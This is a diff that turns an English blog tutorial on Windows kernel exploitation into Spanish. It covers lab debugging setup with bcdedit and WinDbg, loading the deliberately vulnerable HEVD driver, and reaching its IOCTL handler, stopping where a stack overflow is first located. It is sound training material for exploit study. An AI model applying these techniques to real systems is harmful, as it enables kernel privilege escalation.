@@ -1,7 +1,7 @@
 <!doctype html>
 <html lang="en-us">
   <head>
-    <title>0x00 - Introduction to Windows Kernel Exploitation // </title>
+    <title>0x00 - Introducción a Windows Kernel Explotación // </title>
     <link rel="shortcut icon" href="/favicon.ico" />
     <meta charset="utf-8" />
     <meta name="generator" content="Hugo 0.131.0">
@@ -17,20 +17,22 @@
 
     
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="0x00 - Introduction to Windows Kernel Exploitation">
-  <meta name="twitter:description" content="This post will be the first of many in which I present you with a guide into the world of Windows Kernel Exploitation. As with anything in life, you must start somewhere and although we will be focusing on Windows 7 (x86) and Windows 10 (x64) for this post; we will ultimately be working our way up to Windows 11 (x64).
-To get started, for this post you will need:">
+  <meta name="twitter:title" content="0x00 - Introducción a Windows Kernel Explotación">
+  <meta name="twitter:description" content="Esta publicación será la primera de un series donde te guiaré al mundo de Windows Kernel Explotación. Mi papa antes dicia, “no se nace aprendido”. Como todo en la vida hay que empezar por algún lado. El objetivo de esta series es comenzar en Windows 7 (x86) y terminar en Windows 11 (x64). Hoy vamos usar Windows 7 (x86) y Windows 10 (x64).
+Para empezar, baja estos programas:
+Programa de Virtualización: Esto puede ser cualquier desde VirtualBox a VMWare.">
 
-    <meta property="og:url" content="https://wetw0rk.github.io/posts/0x00-introduction-to-windows-kernel-exploitation/">
+    <meta property="og:url" content="https://wetw0rk.github.io/posts/0x00-introducci%C3%B3n-a-windows-kernel-explotaci%C3%B3n/">
   <meta property="og:site_name" content="wetw0rk">
-  <meta property="og:title" content="0x00 - Introduction to Windows Kernel Exploitation">
-  <meta property="og:description" content="This post will be the first of many in which I present you with a guide into the world of Windows Kernel Exploitation. As with anything in life, you must start somewhere and although we will be focusing on Windows 7 (x86) and Windows 10 (x64) for this post; we will ultimately be working our way up to Windows 11 (x64).
-To get started, for this post you will need:">
+  <meta property="og:title" content="0x00 - Introducción a Windows Kernel Explotación">
+  <meta property="og:description" content="Esta publicación será la primera de un series donde te guiaré al mundo de Windows Kernel Explotación. Mi papa antes dicia, “no se nace aprendido”. Como todo en la vida hay que empezar por algún lado. El objetivo de esta series es comenzar en Windows 7 (x86) y terminar en Windows 11 (x64). Hoy vamos usar Windows 7 (x86) y Windows 10 (x64).
+Para empezar, baja estos programas:
+Programa de Virtualización: Esto puede ser cualquier desde VirtualBox a VMWare.">
   <meta property="og:locale" content="en_us">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2024-11-29T00:00:00+00:00">
-    <meta property="article:modified_time" content="2024-11-29T00:00:00+00:00">
+    <meta property="article:published_time" content="2024-12-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-12-01T00:00:00+00:00">
 
 
   </head>
@@ -55,150 +57,152 @@ To get started, for this post you will need:">
       
   <article class="post">
     <header class="post-header">
-      <h1 class ="post-title">0x00 - Introduction to Windows Kernel Exploitation</h1>
+      <h1 class ="post-title">0x00 - Introducción a Windows Kernel Explotación</h1>
       <div class="post-meta">
         <div>
           <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
-          Nov 29, 2024
+          Dec 1, 2024
         </div>
         <div>
           <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
-          17 min read
+          16 min read
         </div>
       </div>
     </header>
     <div class="post-content">
-      <p>This post will be the first of many in which I present you with a guide into the world of Windows Kernel Exploitation. As with anything in life, you must start somewhere and although we will be focusing on Windows 7 (x86) and Windows 10 (x64) for this post; we will ultimately be working our way up to Windows 11 (x64).</p>
-<p>To get started, for this post you will need:</p>
+      <p>Esta publicación será la primera de un series donde te guiaré al mundo de Windows Kernel Explotación. Mi papa antes dicia, &ldquo;no se nace aprendido&rdquo;. Como todo en la vida hay que empezar por algún lado. El objetivo de esta series es comenzar en Windows 7 (x86) y terminar en Windows 11 (x64). Hoy vamos usar Windows 7 (x86) y Windows 10 (x64).</p>
+<p>Para empezar, baja estos programas:</p>
 <ul>
-<li><a href="https://youtu.be/wX75Z-4MEoM?si=JgQvGaH5QF0ptqI4">Virtualization Software</a>: This can be anything from VirtualBox to VMWare. I will leave it up to you which virtualization software you decide to use.</li>
-<li><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools">WinDbg</a>: This will serve as our debugger when working with the kernel, it&rsquo;s important you download it from the Windows Driver Kit and NOT use WinDbg Preview for this series.</li>
-<li><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HEVD</a>: For this tutorial series I will be using HEVD v3.00, at the time of writing this is the latest version. HEVD stands for Hack Sys Extreme Vulnerable Driver, and it will serve as our target for this series.</li>
-<li><a href="https://www.osronline.com/article.cfm%5Earticle=157.htm">OSRLOADER</a>: Since HEVD is a driver, we need a way to load it onto the operating system, to do this I will be using the OSRLOADER application.</li>
-<li><a href="https://www.python.org/">Python</a>: At the time of writing this, I was using version 3.11.5 however any version should be ok.</li>
-<li><a href="https://ghidra-sre.org/">Ghidra</a>: Ghidra will serve as our reverse engineering platform. If you have a copy of IDA Pro, you are more than welcome to adapt this series to use it :)</li>
-<li><a href="https://github.com/wetw0rk/Sickle">Sickle</a>: This will be the payload development framework we will use for opcode generation as well as our token stealing shellcode. If you&rsquo;re reading this in 2024 more than likely the new release is not out so you will have to use the latest branch NOT the latest release (aka just clone the repo).</li>
+<li><a href="https://youtu.be/wX75Z-4MEoM?si=JgQvGaH5QF0ptqI4">Programa de Virtualización</a>: Esto puede ser cualquier desde VirtualBox a VMWare. Dejaré cual programa de virtualización usar en tus manos.</li>
+<li><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools">WinDbg</a>: Esta aplicación nos servirá como instrumento para interactuar con el Kernel, es importante que lo bajes de el Windows Driver Kit y NO el WinDbg Preview para este serie.</li>
+<li><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HEVD</a>: Para este series usaré HEVD v3.00 para demosrar las vulnerabilidades. Al escribir este series, es el versión mas nuevo. HEVD es un controlador (driver) programado para ser intencionalmente vulnerable.</li>
+<li><a href="https://www.osronline.com/article.cfm%5Earticle=157.htm">OSRLOADER</a>: Como HEVD is un controlador, necesitamos una forma de cargarlo en el sistema de operación. Para hacer esto usaremos la aplicación OSRLOADER.</li>
+<li><a href="https://www.python.org/">Python</a>: Al escribir esto, usé versión 3.11.5 sin embargo, cualquier versión debería estar bien.</li>
+<li><a href="https://ghidra-sre.org/">Ghidra</a>: Ghidra será nuestra herramienta para conducta ingeniería inversa (reverse engineering). Si tienes IDA Pro, estas bienvenido a usarlo :)</li>
+<li><a href="https://github.com/wetw0rk/Sickle">Sickle</a>: Esta será la herramienta que utilizaremos para generar shellcode. Si estás leyendo esto en 2024, es probable que el nuevo versión no esta listo. Por esta razón, usa la última rama no la versión mas nueva (simplemente clona el repositorio).</li>
 </ul>
-<p>It is important to note I have structured these guides for you to go from Exploit Developer to Kernel Exploit Developer. If you have never written a ROP chain or are completely unfamiliar with modern memory protections, I heavily recommend you start with Userland exploitation.</p>
-<p>If you’re tight on cash and are looking for free resources I highly recommend the following:</p>
+<p>Es importante saber, he estructurado estas guías para llevarte de Exploit Developer a Kernel Exploit Developer. Si nunca has escrito una cadena de ROP, o estas completamente perdido con protecciones de la memoria moderna. Te recomiendo que empezes con explotación de Userland.</p>
+<p>Si no tienes dinero, te recomiendo lo siguiente:</p>
 <ul>
-<li><a href="https://www.corelan.be/index.php/search/exploit+writing+tutorial+part+1/">Corelan Tutorials</a>: Corelan was one of my biggest inspirations in making these blog posts. When I first started my journey into Exploit Development I read Corelan tutorials 1-11. I believe the content that is presented in them is still relevant to this day. Do not let the lack of modern operating systems used in this free series deter you. Concepts such as Egg Hunters work on Windows 11 just as well as they did for Windows XP.</li>
-<li><a href="https://github.com/wetw0rk/MBE-NOTES">Modern Binary Exploitation</a>: This is a free course written by founders of RET2. With permission of the course authors, I have released my notes on my GitHub which you can use to follow along the slides. Once again, although this subject matter targets Linux x86 it is easily transferable to Windows.</li>
+<li><a href="https://www.corelan.be/index.php/search/exploit+writing+tutorial+part+1/">Corelan Tutorials</a>: Corelan fue una de mis inspiraciones para hacer estas publicaciones. Cuando comencé mi viaje por primera vez en Exploit Development yo leí tutoriales 1-11. Todo presentado en ellos sigue siendo relevante a haste día. No dejes que la falta de sistemas modernas te detenga, conceptos de Windows XP se aplica a Windows 11.</li>
+<li><a href="https://github.com/wetw0rk/MBE-NOTES">Modern Binary Exploitation</a>: Este es un curso escrito por los creadores de RET2 publicada gratis. Con el permiso de los autores del curso, tambien publiqué mis notas en GitHub. Una vez más, esto es para sistemas más antiguos de Linux (x86), pero el conocimiento es transferible.</li>
 </ul>
-<p>If you currently work for an employer or are fortunate enough to choose your training I highly reccomend the following:</p>
+<p>Si prefieres algo más moderno, y puedes, te recomiendo estos cursos:</p>
 <ul>
-<li><a href="https://www.corelan-training.com/">Corelan Training</a>: Corelan offers updated training for the modern Windows environment so if you would prefer updated content his <code>Expert Level Stack</code> course should provide a solid foundation for Windows Exploit Development. I personally have taken his <code>Heap Masterclass</code> in 2019 and in the future I plan to attend again.</li>
-<li><a href="https://wargames.ret2.systems/">RET2 Wargames</a>: RET2 Wargames is a course I took and completed in 2024 and I cannot emphasis enough how much it has impacted me. In addition, after completion I contacted the course authors, and they let me release my MBE notes free. If this is not enough to make you want to support them, I don’t know what is. I have also written an in-depth review, if you would like to learn more: <a href="https://www.linkedin.com/pulse/ret2-systems-wargames-review-milton-valencia-0udrf/">&gt;here&lt;</a>.</li>
+<li><a href="https://www.corelan-training.com/">Corelan Training</a>: Corelan también ofrece cursos para systemas modernas. Así que si prefieres pagar, la clase de <code>Expert Level Stack</code> debería ser un comienzo sólido para explotación de Windows. Yo tomé su <code>Heap Masterclass</code> en 2019 y planeo tomarlo de nuevo.</li>
+<li><a href="https://wargames.ret2.systems/">RET2 Wargames</a>: RET2 Wargames es un curso que tomé y completé en 2024. No puedo decir lo suficiente, este curso lo recomiendo. Además, una vez completé el curso, me comuniqué con los autores del curso y me permitieron publicar mis notas sobre su antiguo curso MBE. Si esto no es suficiente para apoyarlos, yo escribí en mi experiencia <a href="https://www.linkedin.com/pulse/ret2-systems-wargames-review-milton-valencia-0udrf/">&gt;aqi&lt;</a></li>
 </ul>
-<p>As of writing this post, I AM NOT sponsored by RET2 or Corelan. I truly believe in the course authors and if you do a little research, if you can’t now; in the future you will want to support them.</p>
-<p>With that, we&rsquo;re ready to get started!</p>
+<p>Que yo sepa, estos cursos son sólo en inglés. Sin embargo, sé que el lenguaje de programación es universal. Con eso, podemos comenzar!</p>
 <h1 id="table-of-contents">Table of Contents</h1>
 <ul>
-<li><a href="#kernel-debugging-with-windbg">Kernel Debugging with WinDbg</a>
+<li><a href="#trabajando-con-el-kernel-y-windbg">Trabajando con el Kernel y WinDbg</a>
 <ul>
-<li><a href="#configuring-target-computer-debugee">Configuring Target Computer (Debugee)</a></li>
-<li><a href="#virtual-machine-settings">Virtual Machine Settings</a></li>
-<li><a href="#configuring-host-computer-debugger">Configuring Host Computer (Debugger)</a></li>
+<li><a href="#preparando-la-computadora-que-vamos-a-atacar-debugee">Preparando la Computadora Que Vamos a Atacar (Debugee)</a></li>
+<li><a href="#configurando-el-sistema-de-virtualizaci%C3%B3n">Configurando el Sistema de Virtualización</a></li>
+<li><a href="#configurar-la-host-computadora-debugger">Configurar la &ldquo;host&rdquo; Computadora (Debugger)</a></li>
 </ul>
 </li>
-<li><a href="#introduction-to-hevd">Introduction to HEVD</a>
+<li><a href="#introducci%C3%B3n-a-hevd">Introducción a HEVD</a>
 <ul>
-<li><a href="#working-with-device-drivers">Working with Device Drivers</a></li>
-<li><a href="#working-with-hevd-ghidra-and-windbg">Working with HEVD, Ghidra and WinDbg</a></li>
+<li><a href="#trabajando-con-conductores-de-sistemas">Trabajando con Conductores de Sistemas</a></li>
+<li><a href="#trabajando-con-hevd-ghidra-y-windbg">Trabajando con HEVD, Ghidra y WinDbg</a></li>
 </ul>
 </li>
-<li><a href="#stack-overflow-windows-7---x86">Stack Overflow (Windows 7 - x86)</a>
+<li><a href="#explotaci%C3%B3n-de-un-stack-overflow-windows-7---x86">Explotación de un &ldquo;Stack Overflow&rdquo; (Windows 7 - x86)</a>
 <ul>
-<li><a href="#identifying-the-vulnerability">Identifying the Vulnerability</a></li>
-<li><a href="#understanding-bufferoverflowstackioctlhandler">Understanding BufferOverflowStackIoctlHandler</a></li>
-<li><a href="#understanding-triggerbufferoverflowstack">Understanding TriggerBufferOverflowStack</a></li>
+<li><a href="#identificando-la-vulnerabilidad">Identificando la Vulnerabilidad</a></li>
+<li><a href="#entendiendo-bufferoverflowstackioctlhandler">Entendiendo BufferOverflowStackIoctlHandler</a></li>
+<li><a href="#entendiendo-triggerbufferoverflowstack">Entendiendo TriggerBufferOverflowStack</a></li>
 <li><a href="#kernel-shellcode">Kernel Shellcode??</a></li>
-<li><a href="#fixing-the-crash">Fixing The Crash</a></li>
+<li><a href="#arreglando-el-choque">Arreglando el Choque</a></li>
 </ul>
 </li>
-<li><a href="#sources">Sources</a></li>
+<li><a href="#recursos">Recursos</a></li>
 </ul>
-<h1 id="kernel-debugging-with-windbg">Kernel Debugging with WinDbg</h1>
-<p>When reading this tutorial, it&rsquo;s important to recognize two definitions. Firstly, the computer that we will be working from is called the <code>host computer</code> or <code>debugger machine</code>. Whereas the computer that is being debugged, is called the <code>target computer</code> or <code>debugee machine</code>. We will be running our debugee as a virtual machine.</p>
-<h2 id="configuring-target-computer-debugee">Configuring Target Computer (Debugee)</h2>
-<p>To begin, power on the debugee virtual machine and open an administrative command prompt and enter the following commands.</p>
+<h1 id="trabajando-con-el-kernel-y-windbg">Trabajando con el Kernel y WinDbg</h1>
+<p>Al leer este tutorial, es importante que reconozcas dos definiciones. Primero, la computadora donde vamos a estar trabajando se llama la <code>host computer</code> o <code>debugger machine</code>. Mientras, la computadora que vamos a depurar, se llama la <code>target computer</code> o <code>debugee machine</code>. El sistema <code>debugee machine</code>, estará dentro de un programa de virtualización.</p>
+<h2 id="preparando-la-computadora-que-vamos-a-atacar-debugee">Preparando la Computadora Que Vamos a Atacar (Debugee)</h2>
+<p>Para empezar, encende el debugee machine y abre el &ldquo;command prompt&rdquo; con permisos de un administrador y ejecuta lo siguiente:</p>
 <pre tabindex="0"><code>C:\Windows\system32&gt;bcdedit /copy {current} /d &#34;Kernel Debugging On&#34;
 The entry was successfully copied to {3709675a-4632-11ee-b00a-b3e46a698b2a}.
 
 C:\Windows\system32&gt;bcdedit /debug {3709675a-4632-11ee-b00a-b3e46a698b2a} on
 The operation completed successfully.
-</code></pre><p>The commands above will generate an entry in the boot table with debugging enabled. We can confirm this by running <code>bcdedit</code> on its own.</p>
+</code></pre><p>Esto generará una entrada en la &ldquo;boot table&rdquo; que tiene la habilitada de depuración (debug). Nosotras podemos confirmar esto ejecutando <code>bcdedit</code>.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/boot.png" alt="alt text"></p>
-<p>After creating the boot entry (now with debugging enabled), go ahead and launch the <code>System Configuration</code> app. Once opened navigate to the <code>Boot</code> tab. Select your newly added entry and hit <code>Advanced Options...</code>. Then copy the settings as shown below (I used COM2). It&rsquo;s important the baud rate is synced with the <code>host computer</code> which we will configure to be 115200.</p>
+<p>Después de crear la entrada (ahora tiene la habilidad de depurar o &ldquo;debug&rdquo;), abre la aplicación <code>System Configuration</code>. Una vez lo has abierto, ve a la pestaña de <code>Boot</code>. Clicia en la entrada recién agregada y clickia <code>Advanced Options...</code>. Después copia los ajustes como demuestro aqi (yo usé &ldquo;COM2&rdquo;). Es importante que el &ldquo;baud rate&rdquo; está sincronizado con el <code>host computer</code> que configuraremos para ser 115200.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/com_two.png" alt="alt text"></p>
-<p>Hit <code>OK</code>, <code>Apply</code>, <code>OK</code>, then restart the Virtual Machine (VM).</p>
-<h2 id="virtual-machine-settings">Virtual Machine Settings</h2>
-<p>Power off the VM, then open VM settings and add a Serial Port. Once added use the settings as shown below:</p>
+<p>Clickia <code>OK</code>, <code>Apply</code>, <code>OK</code>, después encender y apaga el sistema de virtualización (VM).</p>
+<h2 id="configurando-el-sistema-de-virtualización">Configurando el Sistema de Virtualización</h2>
+<p>Apaga el VM, después ábre la configuración de el VM y agregar un &ldquo;Serial Port&rdquo;, una vez añadido, utilice la configuración presentada aquí:</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/vmware.png" alt="alt text"></p>
-<p>Next time you boot in select the newly added entry as shown below; however we can now move onto the next step.</p>
+<p>La próxima vez que lo arranques, clicia la nueva entrada; sin embargo ahora podemos pasar al siguiente paso.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/entry.png" alt="alt text"></p>
-<h2 id="configuring-host-computer-debugger">Configuring Host Computer (Debugger)</h2>
-<p>Assuming that the <code>target computer</code> was configured open the appropriate <code>WinDbg</code> in my case <code>WinDbg (X64)</code>. Once opened select <code>File</code> then <code>Kernel Debug...</code>.</p>
+<h2 id="configurar-la-host-computadora-debugger">Configurar la &ldquo;host&rdquo; Computadora (Debugger)</h2>
+<p>Suponiendo que la <code>target computer</code> fue configurada correctamente, abre el <code>WinDbg</code> apropiado, en mi caso <code>WinDbg (x64)</code>. Una vez abierto, clicia <code>File</code> y <code>Kernel Debug...</code>.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/kernel_host.png" alt="alt text"></p>
-<p>Once selected a window will pop up, navigate to the <code>COM</code> tab and enter the following (as per your configuration).</p>
+<p>Una vez lo as seleccionado, una ventana se va abrir, vete a la pestaña <code>COM</code> y escribir lo siguiente (cómo programaste tu configuración):</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/port.png" alt="alt text"></p>
-<p>Then hit OK. If you&rsquo;ve not already done so boot into the target computer, and once we&rsquo;ve loaded into the debugging entry, we previously added you should see the following.</p>
+<p>Luego presiona &ldquo;OK&rdquo;. Si no lo has hecho, arrancar la computadora que vas atacar y una vez que hayamos entrado a la nueva entrada que creamos antes, deberías ver lo siguiente:</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/done.png" alt="alt text"></p>
-<p>You now have kernel debugging setup! Now&hellip; as an exercise, do this again on Windows 7.</p>
-<h1 id="introduction-to-hevd">Introduction to HEVD</h1>
-<p>By now you should have learned how to setup kernel debugging that said ensure that you have downloaded HEVD, OSRLOADER, and Python onto the <code>target computer</code> or <code>debugee machine</code>.</p>
-<p>The first time you load HEVD you&rsquo;re going to launch <code>OSRLOADER.exe</code>, be sure to run it as an administrator. You should see the following:</p>
+<p>Pon te orgulloso, as configurado tu primer &ldquo;Kernel Debugger&rdquo;! Ahora&hellip; como ejercicio, hazlo de nuevo en Windows 7.</p>
+<h1 id="introducción-a-hevd">Introducción a HEVD</h1>
+<p>Has aprendido como configurar &ldquo;kernel debugging&rdquo;, con eso, confirmar que as bajado HEVD, OSRLOADER, y Python a el <code>target computer</code> or <code>debugee machine</code>.</p>
+<p>La primera ves que abres HEVD, vas a ejecutar <code>OSRLOADER.exe</code>, asegúrete ejecutarlo como administrador. Deberías ver lo siguiente:</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/osrloader.png" alt="alt text"></p>
-<p>Once launched hit the <code>Browse</code> button and navigate to the appropriate HEVD driver and open it.</p>
+<p>Una vez ejecutado, clicia <code>Browse</code> y ve al HEVD conductor adecuado y abre lo.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/loadit.png" alt="alt text"></p>
-<p>To ensure the driver is loaded on boot, go ahead and select Automatic from the drop down of the Service Start settings. Upon completion hit Register Service, then Start Service. You should see the following message:</p>
+<p>En orden para asegurar que el conductor se va ejecutar cuando arrancamos la computadora, selecciona &ldquo;Automatic&rdquo; de la pestaña de la configuración &ldquo;Service Start&rdquo;. Deberías ver lo siguiente:</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/success.png" alt="alt text"></p>
-<p>Returning to our attached debugger, if you break and list the loaded modules you should see HEVD.</p>
+<p>Volviendo a nuestro debugger, si pausas ejecución y listas los módulos cargados, deberías ver HEVD.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/windbg.png" alt="alt text"></p>
-<p>The next thing we&rsquo;ll need to do is fix the symbols.</p>
+<p>Lo siguiente que debemos hacer es arreglar los simbolos.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/sym.png" alt="alt text"></p>
-<p>Take note of that path: <code>C:\projects\hevd\build\driver\vulnerable\x86\HEVD\HEVD.pdb</code> we&rsquo;ll need to create it on the <code>host computer</code>, and we&rsquo;ll need to copy all the files over like so:</p>
+<p>Toma nota del camino: <code>C:\projects\hevd\build\driver\vulnerable\x86\HEVD\HEVD.pdb</code> necesitaremos crear lo en el <code>host computer</code>, y copiar todos los documentos a el como demostrado aqi:</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/pathsetup.png" alt="alt text"></p>
-<p>Once done, reboot the machine. If everything went well this time you should see the following:</p>
+<p>Después, enciende y apaga la máquina. Si todo salio bien, deberías ver lo siguiente:</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/symload.png" alt="alt text"></p>
-<h2 id="working-with-device-drivers">Working with Device Drivers</h2>
-<p>Device drivers are kernel mode objects so we cannot directly modify them from user mode. In order to interact with drivers, we need to obtain a HANDLE for them. To do this we need to use a symbolic link such as <code>\\Driver</code> and pass it into <code>CreateFileA</code>.</p>
+<h2 id="trabajando-con-conductores-de-sistemas">Trabajando con Conductores de Sistemas</h2>
+<p>Conductores de sistemas o &ldquo;Device Drivers&rdquo; son objetos de el Kernel, lo que significa esto es que no podemos modificarlos directamente desde Userland. Para interactuar con los conductores, nosotros necesitamos un HANDLE para ellos. Para hacer esto, necesitamos usar un enlace simbólico como <code>\\Driver</code> y pasar lo a <code>CreateFileA</code>.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/createfilea.png" alt="alt text"></p>
-<p>Once we&rsquo;ve obtained a handle, we can use <code>DeviceIoControl</code> function to obtain a device input and output control (IOCTL) interface. This interface can send control codes to the device driver, each control code represents an operation for the driver to perform. For example, a control code can ask the device to carry out an action such as formatting a disk.</p>
+<p>Una vez que hayamos obtenido un &ldquo;handle&rdquo;, podemos usar la función <code>DeviceIoControl</code> para obtener control sobre los aparatos a través de el entrada y salida (I/O) sobre el interfaz (IOCTL). Esta interfaz, puede mandar códigos de control a el aparato, cada código de control representa una operación para que el aparato lo pueda ejecutar. Por ejemplo, un código de control le puede preguntar el aparato que ejecutar una acción como borrando el disco.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/deviceiocontrol.png" alt="alt text"></p>
-<p>Let&rsquo;s look at where we can find the information needed to perform these calls within HEVD.</p>
-<h2 id="working-with-hevd-ghidra-and-windbg">Working with HEVD, Ghidra and WinDbg</h2>
-<p>So if we load the <code>HEVD.sys</code> file into ghidra we can see that the <code>entry point</code> of the driver really begins at <code>DriverEntry()</code>. This function is the first routine that is called when the driver is loaded and holds the responsibility of initializing the driver.</p>
+<p>Ate mirar dónde podemos encontrar la información necesaria para realizar estas llamadas dentro de HEVD.</p>
+<h2 id="trabajando-con-hevd-ghidra-y-windbg">Trabajando con HEVD, Ghidra y WinDbg</h2>
+<p>Si cargamos <code>HEVD.sys</code> adentro de ghidra nosotros podemos ver el <code>entry point</code> de el aparato en realidad comienza en <code>DriverEntry()</code>. Esta función es la primera rutina llamado cuando el aparato esta cargado y tiene la responsabilidad de inicializando el aparato.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/entry-ghidra.png" alt="alt text"></p>
-<p>If we enter this function the picture becomes more clear.</p>
+<p>Si entramos en esta función, todo se vuelve más claro.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/DriverEntry.png" alt="alt text"></p>
-<p>Let&rsquo;s take a look at this using WinDbg, to do so reboot the machine and set a breakpoint on the entrypoint before the driver is loaded. You should then hit the breakpoint.</p>
+<p>Usemos WinDbg para ver esto, encienda y apague la máquina y pon un pausa en en el punto de entrada
+antes que el aparato este cargado. Deberías yegar al pausa.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/break_entry.png" alt="alt text"></p>
-<p>If you continue to unassemble from here (<code>u</code> command) you should eventually see the call to <code>IoCreateSymbolicLink</code>. This function will create the symbolic link we can call upon from user-mode.</p>
+<p>Si continúas a desmontar desde aqi (<code>u</code>), eventualmente deberías ver una yamada a <code>IoCreateSymbolicLink</code>.</p>
+<p>Esta función esta responsable de crear el enlace simbólico que nosotras podemos llamar de Userland.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/IoCreateSymLink.png" alt="alt text"></p>
-<p>If we print the first argument, we can see the name of the symbolic link is going to be <code>HackSysExtremeVulnerableDriver</code>.</p>
+<p>Si imprimimos el primer argumento, podemos ver el nombre del enlace simbólico. En este caso va ser <code>HackSysExtremeVulnerableDriver</code>.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/arg1_create.png" alt="alt text"></p>
-<p>We can ignore <code>\\DosDevices</code> as this is a special namespace that Windows uses for the device driver. To interact with it we&rsquo;ll be using <code>\\.\HackSysExtremeVulnerableDriver</code>, we use <code>\\.\</code> since this the &ldquo;Win32 device namespace&rdquo; or &ldquo;raw device namespace&rdquo; that we can use from userland. Although we did not need to step though this, I wanted to see what arguments would be passed into the function when creating the Symbolic Link.</p>
-<p>So how do we send data to HEVD? As prevously mentioned, we&rsquo;re going to be using <code>DeviceIoControl</code>. As a recap, below is the parameters used by the function.</p>
+<p>Nosotras podemos ignorar <code>\\DosDevices</code> este es un espacio especial de nombre que Windows usa para el aparato. Para interactuar con él vamos usar <code>\\.\HackSysExtremeVulnerableDriver</code>, usamos <code>\\.\</code> porque esto es en el espacio &ldquo;Win32 device namespace&rdquo; o &ldquo;raw devive namespace&rdquo; que podemos usar desde userland. Aunque no necesitábamos pasar por esto, quería ver qué argumentos se pasarían a la función cuando creando un enlace simbólico.</p>
+<p>Entonces, ¿cómo enviamos información a HEVD? Como mencioné anteriormente, vamos usar <code>DeviceIoControl</code>.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/deviceiocontrol.png" alt="alt text"></p>
-<p>The main thing we want to focus on is the <code>dwIoControlCode</code> parameter. This will be the &ldquo;command&rdquo; that we want the driver to execute. These &ldquo;commands&rdquo; or requests are sent to the device via I/O request packets also known as <code>IRPs</code>.</p>
-<p>Looking back at the Ghidra decompilation on <code>line 31</code> we see that <code>param_1-&gt;MajorFunction[0xe]</code> is set to <code>IrpDeviceIoCtlHandler</code>. Why? If we look at MSDN we see the following structure definition for this particular object (__DRIVER_OBJECT).</p>
+<p>Lo principal en lo que queremos concentrarnos es el <code>dwIoControlCode</code></p>
+<p>Esto sera la operación que nosotros queremos el aprato que ejecute. Estos operacións o solicitudes son mandados al aparato por un I/O paquete también conocido como <code>IRPs</code>.</p>
+<p>Mirando la descompilación en Ghidra en <code>línea 31</code> miramos que <code>param_1-&gt;MajorFunction[0xe]</code> esta establecido con <code>IrpDeviceIoCtlHandler</code>. Por qué? Si miramos MSDN vemos la definición de estructura para este objeto en particular (__DRIVER_OBJECT).</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/DRIVER_OBJECT.png" alt="alt text"></p>
-<p>Setting this indicates IrpDeviceIoCtlHandler will be the &ldquo;function&rdquo; that controls how the device can be interacted with. We know this based on the IRP Major Function Code 0xE as shown below (this is the index Windows will check for, currently I&rsquo;m looking at this as the &ldquo;main&rdquo; function).</p>
+<p>A poner esto indica que IrpDeviceIoCtlHandler será la &ldquo;función&rdquo; que controla cómo interactuar con el aprato. Esto lo sabemos por el &ldquo;IRP Major Function Code 0xE&rdquo; (Mira esto como la función principal &ldquo;main&rdquo;):</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/irp_codes.png" alt="alt text"></p>
-<p>If we double click on <code>IrpDeviceIoCtlHandler</code> within Ghidra we&rsquo;re presented with a decompilation of this function. Here we can see that HEVD uses a switch statement to handle our I/O requests.</p>
+<p>Si abres <code>IrpDeviceIoCtlHandler</code> sobre Ghidra se nos presenta la descompilación de la función. Aquí vemos que HEVD usa un &ldquo;switch&rdquo; para manejar nuestro mensajes de I/O.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/codes.png" alt="alt text"></p>
-<p>With that we have everything needed to get started with Exploit Development.</p>
-<h1 id="stack-overflow-windows-7---x86">Stack Overflow (Windows 7 - x86)</h1>
-<p>To ease into things why not start with a traditional buffer overflow. To further ease you into this I will also be using <code>python</code>. However, keep in mind that further into this series we will be using <code>C</code> and potentially <code>C++</code>.</p>
-<h2 id="identifying-the-vulnerability">Identifying the Vulnerability</h2>
-<p>Since we have symbols &ldquo;reverse engineering&rdquo; will be straight forward. Within the <em>IrpDeviceIoCtlHandler</em> we can see the stack buffer overflow can be triggered using the I/O control code <strong>0x222003</strong>.</p>
